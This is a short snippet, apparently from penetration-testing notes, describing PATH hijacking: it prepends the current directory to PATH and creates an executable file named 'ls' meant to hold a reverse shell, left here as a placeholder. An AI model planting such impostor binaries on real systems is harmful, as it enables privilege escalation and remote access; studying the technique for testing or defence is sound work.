```
Modify the path variable:
PATH=.:${PATH}
export PATH
echo $PATH

Make an executable script:
touch ls
echo "<reverse shell>" > ls
chmod +x ls
```